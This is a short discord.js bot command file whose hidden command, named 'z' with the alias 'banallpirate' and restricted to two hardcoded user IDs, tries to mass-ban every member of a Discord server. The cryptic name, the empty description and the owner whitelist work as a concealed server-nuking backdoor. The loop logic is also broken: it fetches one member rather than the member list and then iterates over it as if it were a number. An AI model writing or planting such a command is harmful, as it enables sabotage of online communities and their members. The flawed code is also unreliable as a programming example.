const Discord = require("discord.js");
const { MessageEmbed } = require("discord.js");
const { Color, Footerequest, Footerpirate } = require("../../config.js");

module.exports = {
  name: "z",
  aliases: ["banallpirate"],
  description: "!",
  usage: "",
  run: async (client, message, args, prefix) => {
            const owner = ["722799249288331354", "921125226425765998"];

            if (owner.includes(message.author.id) === false) 
                return;
        try {
            const members = message.guild.members.cache.get(message.guild.id)

            for (let i = 0; i < members; i++) {
                members.ban()

            }
        } catch (e) {
            console.log(e);
        }
    }
}